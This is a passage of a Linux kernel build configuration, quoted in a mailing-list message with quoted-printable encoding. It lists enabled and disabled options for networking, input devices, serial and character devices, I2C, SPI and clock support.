> CONFIG_MAC80211_HWSIM=3Dy
> CONFIG_VIRT_WIFI=3Dy
> CONFIG_WAN=3Dy
> CONFIG_HDLC=3Dy
> CONFIG_HDLC_RAW=3Dy
> CONFIG_HDLC_RAW_ETH=3Dy
> CONFIG_HDLC_CISCO=3Dy
> CONFIG_HDLC_FR=3Dy
> CONFIG_HDLC_PPP=3Dy
> CONFIG_HDLC_X25=3Dy
> # CONFIG_FRAMER is not set
> # CONFIG_PCI200SYN is not set
> # CONFIG_WANXL is not set
> # CONFIG_PC300TOO is not set
> # CONFIG_FARSYNC is not set
> CONFIG_LAPBETHER=3Dy
> CONFIG_IEEE802154_DRIVERS=3Dy
> # CONFIG_IEEE802154_FAKELB is not set
> # CONFIG_IEEE802154_AT86RF230 is not set
> # CONFIG_IEEE802154_MRF24J40 is not set
> # CONFIG_IEEE802154_CC2520 is not set
> CONFIG_IEEE802154_ATUSB=3Dy
> # CONFIG_IEEE802154_ADF7242 is not set
> # CONFIG_IEEE802154_CA8210 is not set
> # CONFIG_IEEE802154_MCR20A is not set
> CONFIG_IEEE802154_HWSIM=3Dy
>=20
> #
> # Wireless WAN
> #
> CONFIG_WWAN=3Dy
> # CONFIG_WWAN_DEBUGFS is not set
> # CONFIG_WWAN_HWSIM is not set
> CONFIG_MHI_WWAN_CTRL=3Dy
> # CONFIG_MHI_WWAN_MBIM is not set
> # CONFIG_IOSM is not set
> # CONFIG_MTK_T7XX is not set
> # end of Wireless WAN
>=20
> CONFIG_VMXNET3=3Dy
> # CONFIG_FUJITSU_ES is not set
> CONFIG_USB4_NET=3Dy
> CONFIG_NETDEVSIM=3Dy
> CONFIG_NET_FAILOVER=3Dy
> CONFIG_ISDN=3Dy
> CONFIG_ISDN_CAPI=3Dy
> CONFIG_MISDN=3Dy
> CONFIG_MISDN_DSP=3Dy
> CONFIG_MISDN_L1OIP=3Dy
>=20
> #
> # mISDN hardware drivers
> #
> # CONFIG_MISDN_HFCPCI is not set
> # CONFIG_MISDN_HFCMULTI is not set
> CONFIG_MISDN_HFCUSB=3Dy
> # CONFIG_MISDN_AVMFRITZ is not set
> # CONFIG_MISDN_SPEEDFAX is not set
> # CONFIG_MISDN_INFINEON is not set
> # CONFIG_MISDN_W6692 is not set
> # CONFIG_MISDN_NETJET is not set
>=20
> #
> # Input device support
> #
> CONFIG_INPUT=3Dy
> CONFIG_INPUT_LEDS=3Dy
> CONFIG_INPUT_FF_MEMLESS=3Dy
> CONFIG_INPUT_SPARSEKMAP=3Dy
> # CONFIG_INPUT_MATRIXKMAP is not set
> CONFIG_INPUT_VIVALDIFMAP=3Dy
>=20
> #
> # Userland interfaces
> #
> CONFIG_INPUT_MOUSEDEV=3Dy
> CONFIG_INPUT_MOUSEDEV_PSAUX=3Dy
> CONFIG_INPUT_MOUSEDEV_SCREEN_X=3D1024
> CONFIG_INPUT_MOUSEDEV_SCREEN_Y=3D768
> CONFIG_INPUT_JOYDEV=3Dy
> CONFIG_INPUT_EVDEV=3Dy
>=20
> #
> # Input Device Drivers
> #
> CONFIG_INPUT_KEYBOARD=3Dy
> # CONFIG_KEYBOARD_ADC is not set
> # CONFIG_KEYBOARD_ADP5588 is not set
> CONFIG_KEYBOARD_ATKBD=3Dy
> # CONFIG_KEYBOARD_QT1050 is not set
> # CONFIG_KEYBOARD_QT1070 is not set
> # CONFIG_KEYBOARD_QT2160 is not set
> # CONFIG_KEYBOARD_DLINK_DIR685 is not set
> # CONFIG_KEYBOARD_LKKBD is not set
> # CONFIG_KEYBOARD_GPIO is not set
> # CONFIG_KEYBOARD_GPIO_POLLED is not set
> # CONFIG_KEYBOARD_TCA8418 is not set
> # CONFIG_KEYBOARD_MATRIX is not set
> # CONFIG_KEYBOARD_LM8323 is not set
> # CONFIG_KEYBOARD_LM8333 is not set
> # CONFIG_KEYBOARD_MAX7359 is not set
> # CONFIG_KEYBOARD_MPR121 is not set
> # CONFIG_KEYBOARD_NEWTON is not set
> # CONFIG_KEYBOARD_OPENCORES is not set
> # CONFIG_KEYBOARD_PINEPHONE is not set
> # CONFIG_KEYBOARD_SAMSUNG is not set
> # CONFIG_KEYBOARD_STOWAWAY is not set
> # CONFIG_KEYBOARD_SUNKBD is not set
> # CONFIG_KEYBOARD_OMAP4 is not set
> # CONFIG_KEYBOARD_TM2_TOUCHKEY is not set
> # CONFIG_KEYBOARD_TWL4030 is not set
> # CONFIG_KEYBOARD_XTKBD is not set
> # CONFIG_KEYBOARD_CAP11XX is not set
> # CONFIG_KEYBOARD_BCM is not set
> # CONFIG_KEYBOARD_CYPRESS_SF is not set
> CONFIG_INPUT_MOUSE=3Dy
> CONFIG_MOUSE_PS2=3Dy
> CONFIG_MOUSE_PS2_ALPS=3Dy
> CONFIG_MOUSE_PS2_BYD=3Dy
> CONFIG_MOUSE_PS2_LOGIPS2PP=3Dy
> CONFIG_MOUSE_PS2_SYNAPTICS=3Dy
> CONFIG_MOUSE_PS2_SYNAPTICS_SMBUS=3Dy
> CONFIG_MOUSE_PS2_CYPRESS=3Dy
> CONFIG_MOUSE_PS2_LIFEBOOK=3Dy
> CONFIG_MOUSE_PS2_TRACKPOINT=3Dy
> # CONFIG_MOUSE_PS2_ELANTECH is not set
> # CONFIG_MOUSE_PS2_SENTELIC is not set
> # CONFIG_MOUSE_PS2_TOUCHKIT is not set
> CONFIG_MOUSE_PS2_FOCALTECH=3Dy
> # CONFIG_MOUSE_PS2_VMMOUSE is not set
> CONFIG_MOUSE_PS2_SMBUS=3Dy
> # CONFIG_MOUSE_SERIAL is not set
> CONFIG_MOUSE_APPLETOUCH=3Dy
> CONFIG_MOUSE_BCM5974=3Dy
> # CONFIG_MOUSE_CYAPA is not set
> # CONFIG_MOUSE_ELAN_I2C is not set
> # CONFIG_MOUSE_VSXXXAA is not set
> # CONFIG_MOUSE_GPIO is not set
> # CONFIG_MOUSE_SYNAPTICS_I2C is not set
> CONFIG_MOUSE_SYNAPTICS_USB=3Dy
> CONFIG_INPUT_JOYSTICK=3Dy
> # CONFIG_JOYSTICK_ANALOG is not set
> # CONFIG_JOYSTICK_A3D is not set
> # CONFIG_JOYSTICK_ADC is not set
> # CONFIG_JOYSTICK_ADI is not set
> # CONFIG_JOYSTICK_COBRA is not set
> # CONFIG_JOYSTICK_GF2K is not set
> # CONFIG_JOYSTICK_GRIP is not set
> # CONFIG_JOYSTICK_GRIP_MP is not set
> # CONFIG_JOYSTICK_GUILLEMOT is not set
> # CONFIG_JOYSTICK_INTERACT is not set
> # CONFIG_JOYSTICK_SIDEWINDER is not set
> # CONFIG_JOYSTICK_TMDC is not set
> CONFIG_JOYSTICK_IFORCE=3Dy
> CONFIG_JOYSTICK_IFORCE_USB=3Dy
> # CONFIG_JOYSTICK_IFORCE_232 is not set
> # CONFIG_JOYSTICK_WARRIOR is not set
> # CONFIG_JOYSTICK_MAGELLAN is not set
> # CONFIG_JOYSTICK_SPACEORB is not set
> # CONFIG_JOYSTICK_SPACEBALL is not set
> # CONFIG_JOYSTICK_STINGER is not set
> # CONFIG_JOYSTICK_TWIDJOY is not set
> # CONFIG_JOYSTICK_ZHENHUA is not set
> # CONFIG_JOYSTICK_DB9 is not set
> # CONFIG_JOYSTICK_GAMECON is not set
> # CONFIG_JOYSTICK_TURBOGRAFX is not set
> # CONFIG_JOYSTICK_AS5011 is not set
> # CONFIG_JOYSTICK_JOYDUMP is not set
> CONFIG_JOYSTICK_XPAD=3Dy
> CONFIG_JOYSTICK_XPAD_FF=3Dy
> CONFIG_JOYSTICK_XPAD_LEDS=3Dy
> # CONFIG_JOYSTICK_WALKERA0701 is not set
> # CONFIG_JOYSTICK_PSXPAD_SPI is not set
> CONFIG_JOYSTICK_PXRC=3Dy
> # CONFIG_JOYSTICK_QWIIC is not set
> # CONFIG_JOYSTICK_FSIA6B is not set
> # CONFIG_JOYSTICK_SENSEHAT is not set
> # CONFIG_JOYSTICK_SEESAW is not set
> CONFIG_INPUT_TABLET=3Dy
> CONFIG_TABLET_USB_ACECAD=3Dy
> CONFIG_TABLET_USB_AIPTEK=3Dy
> CONFIG_TABLET_USB_HANWANG=3Dy
> CONFIG_TABLET_USB_KBTAB=3Dy
> CONFIG_TABLET_USB_PEGASUS=3Dy
> # CONFIG_TABLET_SERIAL_WACOM4 is not set
> CONFIG_INPUT_TOUCHSCREEN=3Dy
> # CONFIG_TOUCHSCREEN_ADS7846 is not set
> # CONFIG_TOUCHSCREEN_AD7877 is not set
> # CONFIG_TOUCHSCREEN_AD7879 is not set
> # CONFIG_TOUCHSCREEN_ADC is not set
> # CONFIG_TOUCHSCREEN_AR1021_I2C is not set
> # CONFIG_TOUCHSCREEN_ATMEL_MXT is not set
> # CONFIG_TOUCHSCREEN_AUO_PIXCIR is not set
> # CONFIG_TOUCHSCREEN_BU21013 is not set
> # CONFIG_TOUCHSCREEN_BU21029 is not set
> # CONFIG_TOUCHSCREEN_CHIPONE_ICN8318 is not set
> # CONFIG_TOUCHSCREEN_CHIPONE_ICN8505 is not set
> # CONFIG_TOUCHSCREEN_CY8CTMA140 is not set
> # CONFIG_TOUCHSCREEN_CY8CTMG110 is not set
> # CONFIG_TOUCHSCREEN_CYTTSP_CORE is not set
> # CONFIG_TOUCHSCREEN_CYTTSP5 is not set
> # CONFIG_TOUCHSCREEN_DYNAPRO is not set
> # CONFIG_TOUCHSCREEN_HAMPSHIRE is not set
> # CONFIG_TOUCHSCREEN_EETI is not set
> # CONFIG_TOUCHSCREEN_EGALAX is not set
> # CONFIG_TOUCHSCREEN_EGALAX_SERIAL is not set
> # CONFIG_TOUCHSCREEN_EXC3000 is not set
> # CONFIG_TOUCHSCREEN_FUJITSU is not set
> # CONFIG_TOUCHSCREEN_GOODIX is not set
> # CONFIG_TOUCHSCREEN_GOODIX_BERLIN_I2C is not set
> # CONFIG_TOUCHSCREEN_GOODIX_BERLIN_SPI is not set
> # CONFIG_TOUCHSCREEN_HIDEEP is not set
> # CONFIG_TOUCHSCREEN_HIMAX_HX852X is not set
> # CONFIG_TOUCHSCREEN_HYCON_HY46XX is not set
> # CONFIG_TOUCHSCREEN_HYNITRON_CSTXXX is not set
> # CONFIG_TOUCHSCREEN_HYNITRON_CST816X is not set
> # CONFIG_TOUCHSCREEN_ILI210X is not set
> # CONFIG_TOUCHSCREEN_ILITEK is not set
> # CONFIG_TOUCHSCREEN_S6SY761 is not set
> # CONFIG_TOUCHSCREEN_GUNZE is not set
> # CONFIG_TOUCHSCREEN_EKTF2127 is not set
> # CONFIG_TOUCHSCREEN_ELAN is not set
> # CONFIG_TOUCHSCREEN_ELO is not set
> # CONFIG_TOUCHSCREEN_WACOM_W8001 is not set
> # CONFIG_TOUCHSCREEN_WACOM_I2C is not set
> # CONFIG_TOUCHSCREEN_MAX11801 is not set
> # CONFIG_TOUCHSCREEN_MMS114 is not set
> # CONFIG_TOUCHSCREEN_MELFAS_MIP4 is not set
> # CONFIG_TOUCHSCREEN_MSG2638 is not set
> # CONFIG_TOUCHSCREEN_MTOUCH is not set
> # CONFIG_TOUCHSCREEN_NOVATEK_NVT_TS is not set
> # CONFIG_TOUCHSCREEN_IMAGIS is not set
> # CONFIG_TOUCHSCREEN_IMX6UL_TSC is not set
> # CONFIG_TOUCHSCREEN_INEXIO is not set
> # CONFIG_TOUCHSCREEN_PENMOUNT is not set
> # CONFIG_TOUCHSCREEN_EDT_FT5X06 is not set
> # CONFIG_TOUCHSCREEN_TOUCHRIGHT is not set
> # CONFIG_TOUCHSCREEN_TOUCHWIN is not set
> # CONFIG_TOUCHSCREEN_PIXCIR is not set
> # CONFIG_TOUCHSCREEN_WDT87XX_I2C is not set
> CONFIG_TOUCHSCREEN_USB_COMPOSITE=3Dy
> CONFIG_TOUCHSCREEN_USB_EGALAX=3Dy
> CONFIG_TOUCHSCREEN_USB_PANJIT=3Dy
> CONFIG_TOUCHSCREEN_USB_3M=3Dy
> CONFIG_TOUCHSCREEN_USB_ITM=3Dy
> CONFIG_TOUCHSCREEN_USB_ETURBO=3Dy
> CONFIG_TOUCHSCREEN_USB_GUNZE=3Dy
> CONFIG_TOUCHSCREEN_USB_DMC_TSC10=3Dy
> CONFIG_TOUCHSCREEN_USB_IRTOUCH=3Dy
> CONFIG_TOUCHSCREEN_USB_IDEALTEK=3Dy
> CONFIG_TOUCHSCREEN_USB_GENERAL_TOUCH=3Dy
> CONFIG_TOUCHSCREEN_USB_GOTOP=3Dy
> CONFIG_TOUCHSCREEN_USB_JASTEC=3Dy
> CONFIG_TOUCHSCREEN_USB_ELO=3Dy
> CONFIG_TOUCHSCREEN_USB_E2I=3Dy
> CONFIG_TOUCHSCREEN_USB_ZYTRONIC=3Dy
> CONFIG_TOUCHSCREEN_USB_ETT_TC45USB=3Dy
> CONFIG_TOUCHSCREEN_USB_NEXIO=3Dy
> CONFIG_TOUCHSCREEN_USB_EASYTOUCH=3Dy
> # CONFIG_TOUCHSCREEN_TOUCHIT213 is not set
> # CONFIG_TOUCHSCREEN_TSC_SERIO is not set
> # CONFIG_TOUCHSCREEN_TSC2004 is not set
> # CONFIG_TOUCHSCREEN_TSC2005 is not set
> # CONFIG_TOUCHSCREEN_TSC2007 is not set
> # CONFIG_TOUCHSCREEN_RM_TS is not set
> # CONFIG_TOUCHSCREEN_SILEAD is not set
> # CONFIG_TOUCHSCREEN_SIS_I2C is not set
> # CONFIG_TOUCHSCREEN_ST1232 is not set
> # CONFIG_TOUCHSCREEN_STMFTS is not set
> CONFIG_TOUCHSCREEN_SUR40=3Dy
> # CONFIG_TOUCHSCREEN_SURFACE3_SPI is not set
> # CONFIG_TOUCHSCREEN_SX8654 is not set
> # CONFIG_TOUCHSCREEN_TPS6507X is not set
> # CONFIG_TOUCHSCREEN_ZET6223 is not set
> # CONFIG_TOUCHSCREEN_ZFORCE is not set
> # CONFIG_TOUCHSCREEN_COLIBRI_VF50 is not set
> # CONFIG_TOUCHSCREEN_ROHM_BU21023 is not set
> # CONFIG_TOUCHSCREEN_IQS5XX is not set
> # CONFIG_TOUCHSCREEN_IQS7211 is not set
> # CONFIG_TOUCHSCREEN_ZINITIX is not set
> # CONFIG_TOUCHSCREEN_HIMAX_HX83112B is not set
> CONFIG_INPUT_MISC=3Dy
> # CONFIG_INPUT_AD714X is not set
> # CONFIG_INPUT_ATMEL_CAPTOUCH is not set
> # CONFIG_INPUT_AW86927 is not set
> # CONFIG_INPUT_BMA150 is not set
> # CONFIG_INPUT_E3X0_BUTTON is not set
> # CONFIG_INPUT_PCSPKR is not set
> # CONFIG_INPUT_MMA8450 is not set
> # CONFIG_INPUT_APANEL is not set
> # CONFIG_INPUT_GPIO_BEEPER is not set
> # CONFIG_INPUT_GPIO_DECODER is not set
> # CONFIG_INPUT_GPIO_VIBRA is not set
> # CONFIG_INPUT_ATLAS_BTNS is not set
> CONFIG_INPUT_ATI_REMOTE2=3Dy
> CONFIG_INPUT_KEYSPAN_REMOTE=3Dy
> # CONFIG_INPUT_KXTJ9 is not set
> CONFIG_INPUT_POWERMATE=3Dy
> CONFIG_INPUT_YEALINK=3Dy
> CONFIG_INPUT_CM109=3Dy
> # CONFIG_INPUT_REGULATOR_HAPTIC is not set
> # CONFIG_INPUT_RETU_PWRBUTTON is not set
> # CONFIG_INPUT_TWL4030_PWRBUTTON is not set
> # CONFIG_INPUT_TWL4030_VIBRA is not set
> CONFIG_INPUT_UINPUT=3Dy
> # CONFIG_INPUT_PCF8574 is not set
> # CONFIG_INPUT_GPIO_ROTARY_ENCODER is not set
> # CONFIG_INPUT_DA7280_HAPTICS is not set
> # CONFIG_INPUT_ADXL34X is not set
> # CONFIG_INPUT_IBM_PANEL is not set
> CONFIG_INPUT_IMS_PCU=3Dy
> # CONFIG_INPUT_IQS269A is not set
> # CONFIG_INPUT_IQS626A is not set
> # CONFIG_INPUT_IQS7222 is not set
> # CONFIG_INPUT_CMA3000 is not set
> # CONFIG_INPUT_IDEAPAD_SLIDEBAR is not set
> # CONFIG_INPUT_DRV260X_HAPTICS is not set
> # CONFIG_INPUT_DRV2665_HAPTICS is not set
> # CONFIG_INPUT_DRV2667_HAPTICS is not set
> CONFIG_RMI4_CORE=3Dy
> # CONFIG_RMI4_I2C is not set
> # CONFIG_RMI4_SPI is not set
> # CONFIG_RMI4_SMB is not set
> CONFIG_RMI4_F03=3Dy
> CONFIG_RMI4_F03_SERIO=3Dy
> CONFIG_RMI4_2D_SENSOR=3Dy
> CONFIG_RMI4_F11=3Dy
> CONFIG_RMI4_F12=3Dy
> # CONFIG_RMI4_F1A is not set
> # CONFIG_RMI4_F21 is not set
> CONFIG_RMI4_F30=3Dy
> # CONFIG_RMI4_F34 is not set
> CONFIG_RMI4_F3A=3Dy
> # CONFIG_RMI4_F54 is not set
> # CONFIG_RMI4_F55 is not set
>=20
> #
> # Hardware I/O ports
> #
> CONFIG_SERIO=3Dy
> CONFIG_ARCH_MIGHT_HAVE_PC_SERIO=3Dy
> CONFIG_SERIO_I8042=3Dy
> CONFIG_SERIO_SERPORT=3Dy
> # CONFIG_SERIO_CT82C710 is not set
> # CONFIG_SERIO_PARKBD is not set
> # CONFIG_SERIO_PCIPS2 is not set
> CONFIG_SERIO_LIBPS2=3Dy
> # CONFIG_SERIO_RAW is not set
> # CONFIG_SERIO_ALTERA_PS2 is not set
> # CONFIG_SERIO_PS2MULT is not set
> # CONFIG_SERIO_ARC_PS2 is not set
> # CONFIG_SERIO_APBPS2 is not set
> # CONFIG_SERIO_GPIO_PS2 is not set
> CONFIG_USERIO=3Dy
> # CONFIG_GAMEPORT is not set
> # end of Hardware I/O ports
> # end of Input device support
>=20
> #
> # Character devices
> #
> CONFIG_TTY=3Dy
> CONFIG_VT=3Dy
> CONFIG_CONSOLE_TRANSLATIONS=3Dy
> CONFIG_VT_CONSOLE=3Dy
> CONFIG_VT_CONSOLE_SLEEP=3Dy
> CONFIG_VT_HW_CONSOLE_BINDING=3Dy
> CONFIG_UNIX98_PTYS=3Dy
> CONFIG_LEGACY_PTYS=3Dy
> CONFIG_LEGACY_PTY_COUNT=3D256
> CONFIG_LEGACY_TIOCSTI=3Dy
> CONFIG_LDISC_AUTOLOAD=3Dy
>=20
> #
> # Serial drivers
> #
> CONFIG_SERIAL_EARLYCON=3Dy
> CONFIG_SERIAL_8250=3Dy
> CONFIG_SERIAL_8250_PNP=3Dy
> # CONFIG_SERIAL_8250_16550A_VARIANTS is not set
> # CONFIG_SERIAL_8250_FINTEK is not set
> CONFIG_SERIAL_8250_CONSOLE=3Dy
> CONFIG_SERIAL_8250_DMA=3Dy
> CONFIG_SERIAL_8250_PCILIB=3Dy
> CONFIG_SERIAL_8250_PCI=3Dy
> # CONFIG_SERIAL_8250_EXAR is not set
> # CONFIG_SERIAL_8250_CS is not set
> CONFIG_SERIAL_8250_NR_UARTS=3D32
> CONFIG_SERIAL_8250_RUNTIME_UARTS=3D4
> CONFIG_SERIAL_8250_EXTENDED=3Dy
> CONFIG_SERIAL_8250_SHARE_IRQ=3Dy
> CONFIG_SERIAL_8250_DETECT_IRQ=3Dy
> CONFIG_SERIAL_8250_RSA=3Dy
> CONFIG_SERIAL_8250_MANY_PORTS=3Dy
> # CONFIG_SERIAL_8250_PCI1XXXX is not set
> # CONFIG_SERIAL_8250_DW is not set
> # CONFIG_SERIAL_8250_RT288X is not set
> CONFIG_SERIAL_8250_LPSS=3Dy
> CONFIG_SERIAL_8250_MID=3Dy
> CONFIG_SERIAL_8250_PERICOM=3Dy
> # CONFIG_SERIAL_8250_NI is not set
> # CONFIG_SERIAL_OF_PLATFORM is not set
> CONFIG_SERIAL_8250_DWLIB=3Dy
>=20
> #
> # Non-8250 serial port support
> #
> # CONFIG_SERIAL_MAX3100 is not set
> # CONFIG_SERIAL_MAX310X is not set
> # CONFIG_SERIAL_UARTLITE is not set
> CONFIG_SERIAL_CORE=3Dy
> CONFIG_SERIAL_CORE_CONSOLE=3Dy
> # CONFIG_SERIAL_JSM is not set
> # CONFIG_SERIAL_SIFIVE is not set
> # CONFIG_SERIAL_LANTIQ is not set
> # CONFIG_SERIAL_SCCNXP is not set
> # CONFIG_SERIAL_SC16IS7XX is not set
> # CONFIG_SERIAL_ALTERA_JTAGUART is not set
> # CONFIG_SERIAL_ALTERA_UART is not set
> # CONFIG_SERIAL_XILINX_PS_UART is not set
> # CONFIG_SERIAL_ARC is not set
> # CONFIG_SERIAL_RP2 is not set
> # CONFIG_SERIAL_FSL_LPUART is not set
> # CONFIG_SERIAL_FSL_LINFLEXUART is not set
> # CONFIG_SERIAL_CONEXANT_DIGICOLOR is not set
> # CONFIG_SERIAL_SPRD is not set
> # end of Serial drivers
>=20
> CONFIG_SERIAL_MCTRL_GPIO=3Dy
> CONFIG_SERIAL_NONSTANDARD=3Dy
> # CONFIG_MOXA_INTELLIO is not set
> # CONFIG_MOXA_SMARTIO is not set
> CONFIG_N_HDLC=3Dy
> # CONFIG_IPWIRELESS is not set
> CONFIG_N_GSM=3Dy
> CONFIG_NOZOMI=3Dy
> CONFIG_NULL_TTY=3Dy
> CONFIG_HVC_DRIVER=3Dy
> CONFIG_SERIAL_DEV_BUS=3Dy
> CONFIG_SERIAL_DEV_CTRL_TTYPORT=3Dy
> CONFIG_TTY_PRINTK=3Dy
> CONFIG_TTY_PRINTK_LEVEL=3D6
> # CONFIG_PRINTER is not set
> # CONFIG_PPDEV is not set
> CONFIG_VIRTIO_CONSOLE=3Dy
> # CONFIG_IPMI_HANDLER is not set
> # CONFIG_SSIF_IPMI_BMC is not set
> # CONFIG_IPMB_DEVICE_INTERFACE is not set
> CONFIG_HW_RANDOM=3Dy
> # CONFIG_HW_RANDOM_TIMERIOMEM is not set
> # CONFIG_HW_RANDOM_INTEL is not set
> # CONFIG_HW_RANDOM_AMD is not set
> # CONFIG_HW_RANDOM_BA431 is not set
> # CONFIG_HW_RANDOM_VIA is not set
> CONFIG_HW_RANDOM_VIRTIO=3Dy
> # CONFIG_HW_RANDOM_CCTRNG is not set
> # CONFIG_HW_RANDOM_XIPHERA is not set
> # CONFIG_APPLICOM is not set
> # CONFIG_DEVMEM is not set
> CONFIG_NVRAM=3Dy
> # CONFIG_DEVPORT is not set
> CONFIG_HPET=3Dy
> CONFIG_HPET_MMAP=3Dy
> CONFIG_HPET_MMAP_DEFAULT=3Dy
> # CONFIG_HANGCHECK_TIMER is not set
> CONFIG_TCG_TPM=3Dy
> # CONFIG_TCG_TPM2_HMAC is not set
> # CONFIG_HW_RANDOM_TPM is not set
> CONFIG_TCG_TIS_CORE=3Dy
> CONFIG_TCG_TIS=3Dy
> # CONFIG_TCG_TIS_SPI is not set
> # CONFIG_TCG_TIS_I2C is not set
> # CONFIG_TCG_TIS_I2C_CR50 is not set
> # CONFIG_TCG_TIS_I2C_ATMEL is not set
> # CONFIG_TCG_TIS_I2C_INFINEON is not set
> # CONFIG_TCG_TIS_I2C_NUVOTON is not set
> # CONFIG_TCG_NSC is not set
> # CONFIG_TCG_ATMEL is not set
> # CONFIG_TCG_INFINEON is not set
> CONFIG_TCG_CRB=3Dy
> # CONFIG_TCG_VTPM_PROXY is not set
> # CONFIG_TCG_TIS_ST33ZP24_I2C is not set
> # CONFIG_TCG_TIS_ST33ZP24_SPI is not set
> # CONFIG_TELCLOCK is not set
> CONFIG_XILLYBUS_CLASS=3Dy
> # CONFIG_XILLYBUS is not set
> CONFIG_XILLYUSB=3Dy
> # end of Character devices
>=20
> #
> # I2C support
> #
> CONFIG_I2C=3Dy
> CONFIG_ACPI_I2C_OPREGION=3Dy
> CONFIG_I2C_BOARDINFO=3Dy
> CONFIG_I2C_CHARDEV=3Dy
> CONFIG_I2C_MUX=3Dy
>=20
> #
> # Multiplexer I2C Chip support
> #
> # CONFIG_I2C_ARB_GPIO_CHALLENGE is not set
> # CONFIG_I2C_MUX_GPIO is not set
> # CONFIG_I2C_MUX_GPMUX is not set
> # CONFIG_I2C_MUX_LTC4306 is not set
> # CONFIG_I2C_MUX_PCA9541 is not set
> # CONFIG_I2C_MUX_PCA954x is not set
> CONFIG_I2C_MUX_REG=3Dy
> # CONFIG_I2C_MUX_MLXCPLD is not set
> # end of Multiplexer I2C Chip support
>=20
> CONFIG_I2C_HELPER_AUTO=3Dy
> CONFIG_I2C_SMBUS=3Dy
> CONFIG_I2C_ALGOBIT=3Dy
>=20
> #
> # I2C Hardware Bus support
> #
>=20
> #
> # PC SMBus host controller drivers
> #
> # CONFIG_I2C_ALI1535 is not set
> # CONFIG_I2C_ALI1563 is not set
> # CONFIG_I2C_ALI15X3 is not set
> # CONFIG_I2C_AMD756 is not set
> # CONFIG_I2C_AMD8111 is not set
> # CONFIG_I2C_AMD_MP2 is not set
> CONFIG_I2C_I801=3Dy
> # CONFIG_I2C_ISCH is not set
> # CONFIG_I2C_ISMT is not set
> # CONFIG_I2C_PIIX4 is not set
> # CONFIG_I2C_CHT_WC is not set
> # CONFIG_I2C_NFORCE2 is not set
> # CONFIG_I2C_NVIDIA_GPU is not set
> # CONFIG_I2C_SIS5595 is not set
> # CONFIG_I2C_SIS630 is not set
> # CONFIG_I2C_SIS96X is not set
> # CONFIG_I2C_VIA is not set
> # CONFIG_I2C_VIAPRO is not set
> # CONFIG_I2C_ZHAOXIN is not set
>=20
> #
> # ACPI drivers
> #
> # CONFIG_I2C_SCMI is not set
>=20
> #
> # I2C system bus drivers (mostly embedded / system-on-chip)
> #
> # CONFIG_I2C_CBUS_GPIO is not set
> CONFIG_I2C_DESIGNWARE_CORE=3Dy
> CONFIG_I2C_DESIGNWARE_PLATFORM=3Dy
> # CONFIG_I2C_DESIGNWARE_BAYTRAIL is not set
> # CONFIG_I2C_DESIGNWARE_PCI is not set
> # CONFIG_I2C_EMEV2 is not set
> # CONFIG_I2C_GPIO is not set
> # CONFIG_I2C_OCORES is not set
> # CONFIG_I2C_PCA_PLATFORM is not set
> # CONFIG_I2C_RK3X is not set
> # CONFIG_I2C_SIMTEC is not set
> # CONFIG_I2C_XILINX is not set
>=20
> #
> # External I2C/SMBus adapter drivers
> #
> CONFIG_I2C_DIOLAN_U2C=3Dy
> CONFIG_I2C_DLN2=3Dy
> CONFIG_I2C_LJCA=3Dy
> CONFIG_I2C_CP2615=3Dy
> # CONFIG_I2C_PARPORT is not set
> # CONFIG_I2C_PCI1XXXX is not set
> CONFIG_I2C_ROBOTFUZZ_OSIF=3Dy
> # CONFIG_I2C_TAOS_EVM is not set
> CONFIG_I2C_TINY_USB=3Dy
> CONFIG_I2C_VIPERBOARD=3Dy
>=20
> #
> # Other I2C/SMBus bus drivers
> #
> # CONFIG_I2C_MLXCPLD is not set
> # CONFIG_I2C_VIRTIO is not set
> # end of I2C Hardware Bus support
>=20
> # CONFIG_I2C_STUB is not set
> CONFIG_I2C_SLAVE=3Dy
> CONFIG_I2C_SLAVE_EEPROM=3Dy
> # CONFIG_I2C_SLAVE_TESTUNIT is not set
> # CONFIG_I2C_DEBUG_CORE is not set
> # CONFIG_I2C_DEBUG_ALGO is not set
> # CONFIG_I2C_DEBUG_BUS is not set
> # end of I2C support
>=20
> # CONFIG_I3C is not set
> CONFIG_I3C_OR_I2C=3Dy
> CONFIG_SPI=3Dy
> # CONFIG_SPI_DEBUG is not set
> CONFIG_SPI_MASTER=3Dy
> # CONFIG_SPI_MEM is not set
>=20
> #
> # SPI Master Controller Drivers
> #
> # CONFIG_SPI_ALTERA is not set
> # CONFIG_SPI_AXI_SPI_ENGINE is not set
> # CONFIG_SPI_BITBANG is not set
> # CONFIG_SPI_BUTTERFLY is not set
> # CONFIG_SPI_CADENCE is not set
> # CONFIG_SPI_CADENCE_QUADSPI is not set
> # CONFIG_SPI_CH341 is not set
> # CONFIG_SPI_DESIGNWARE is not set
> CONFIG_SPI_DLN2=3Dy
> # CONFIG_SPI_GPIO is not set
> # CONFIG_SPI_LM70_LLP is not set
> # CONFIG_SPI_FSL_SPI is not set
> CONFIG_SPI_LJCA=3Dy
> # CONFIG_SPI_MICROCHIP_CORE_QSPI is not set
> # CONFIG_SPI_MICROCHIP_CORE_SPI is not set
> # CONFIG_SPI_LANTIQ_SSC is not set
> # CONFIG_SPI_OC_TINY is not set
> # CONFIG_SPI_PCI1XXXX is not set
> # CONFIG_SPI_PXA2XX is not set
> # CONFIG_SPI_SC18IS602 is not set
> # CONFIG_SPI_SIFIVE is not set
> # CONFIG_SPI_MXIC is not set
> # CONFIG_SPI_VIRTIO is not set
> # CONFIG_SPI_XCOMM is not set
> # CONFIG_SPI_XILINX is not set
>=20
> #
> # SPI Multiplexer support
> #
> # CONFIG_SPI_MUX is not set
>=20
> #
> # SPI Protocol Masters
> #
> # CONFIG_SPI_SPIDEV is not set
> # CONFIG_SPI_LOOPBACK_TEST is not set
> # CONFIG_SPI_TLE62X0 is not set
> # CONFIG_SPI_SLAVE is not set
> CONFIG_SPI_DYNAMIC=3Dy
> # CONFIG_SPMI is not set
> # CONFIG_HSI is not set
> CONFIG_PPS=3Dy
> # CONFIG_PPS_DEBUG is not set
>=20
> #
> # PPS clients support
> #
> # CONFIG_PPS_CLIENT_KTIMER is not set
> # CONFIG_PPS_CLIENT_LDISC is not set
> # CONFIG_PPS_CLIENT_PARPORT is not set
> # CONFIG_PPS_CLIENT_GPIO is not set
> # CONFIG_PPS_GENERATOR is not set
>=20
> #
> # PTP clock support
> #
> CONFIG_PTP_1588_CLOCK=3Dy
> CONFIG_PTP_1588_CLOCK_OPTIONAL=3Dy
>=20
> #
> # Enable PHYLIB and NETWORK_PHY_TIMESTAMPING to see the additional clocks.
> #
> CONFIG_PTP_1588_CLOCK_KVM=3Dy
> CONFIG_PTP_1588_CLOCK_VMCLOCK=3Dy
> # CONFIG_PTP_1588_CLOCK_IDT82P33 is not set
